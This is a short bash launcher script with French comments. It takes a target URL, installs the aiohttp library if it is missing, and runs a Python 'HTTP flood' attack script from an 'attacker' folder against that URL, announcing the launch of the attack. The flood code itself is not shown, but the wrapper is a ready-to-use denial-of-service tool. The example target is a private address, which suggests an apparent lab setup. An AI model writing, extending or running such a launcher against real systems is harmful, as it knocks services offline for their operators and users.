#!/bin/bash
# launch.sh - Lance uniquement le flood HTTP avancé

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

log() { echo -e "${BLUE}[+]${NC} $1"; }
error() { echo -e "${RED}[!]${NC} $1" >&2; exit 1; }

if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <URL_CIBLE>"
    echo "Exemple: $0 http://192.168.1.10:8000"
    exit 1
fi

TARGET_URL="$1"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FLOOD_SCRIPT="$SCRIPT_DIR/attacker/http-flood-ultimate.py"

[[ -f "$FLOOD_SCRIPT" ]] || error "Script non trouvé : $FLOOD_SCRIPT"

# Vérifie les dépendances
python3 -c "import aiohttp" 2>/dev/null || {
    log "Installation de aiohttp..."
    pip3 install aiohttp
}

log "🚀 Lancement de l'attaque HTTP flood vers $TARGET_URL"
log "💡 Appuyez sur Ctrl+C pour arrêter à tout moment."

exec python3 "$FLOOD_SCRIPT" "$TARGET_URL"
